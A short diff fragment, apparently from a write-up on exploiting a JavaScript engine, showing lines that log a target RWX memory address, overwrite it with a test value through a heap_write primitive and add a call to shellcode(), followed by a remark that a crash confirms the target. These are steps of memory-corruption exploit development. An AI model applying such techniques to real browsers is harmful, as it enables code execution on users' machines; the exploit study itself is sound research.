@@ -112,6 +112,7 @@ console.log('target_rwx ' + ToHex(target_rwx));
 console.log('orignal_rwx_address ' + ToHex(orignal_rwx_address));
 
 heap_write(target_rwx,0x42424242n);
+shellcode();
 
 ```
 Process crash confirms new address as target
